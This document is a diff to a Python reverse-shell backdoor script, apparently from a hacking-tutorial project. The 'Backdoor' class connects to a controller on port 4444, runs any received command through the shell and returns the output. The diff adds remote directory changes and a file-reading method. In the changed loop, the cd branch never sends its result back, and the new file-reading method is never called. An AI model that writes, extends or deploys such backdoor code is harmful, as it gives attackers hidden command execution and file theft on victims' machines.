@@ -1,5 +1,5 @@
 #!/usr/bin/env python
-
+import os
 import socket
 import subprocess
 import json
@@ -26,15 +26,25 @@ class Backdoor:
     def execute_system_command(self, command):
         return subprocess.check_output(command, shell=True)
 
+    def change_working_dir(self, path):
+        os.chdir(path)
+        return f"[+] Changing working director to {path}"
+
+    def read_file(self, path):
+        with open(path, "rb") as file:
+            return file.read()
+
     def run(self):
         while True:
             command = self.reliable_receive()
             if command[0] == "exit":
                 self.connection.close()
                 exit()
-
-            command_result = self.execute_system_command(command)
-            self.reliable_send(command_result)
+            elif command[0] == "cd" and len(command) > 1:
+                command_result = self.change_working_dir(command[1])
+            else:
+                command_result = self.execute_system_command(command)
+                self.reliable_send(command_result)
 
 
 my_backdoor = Backdoor("localhost", 4444)
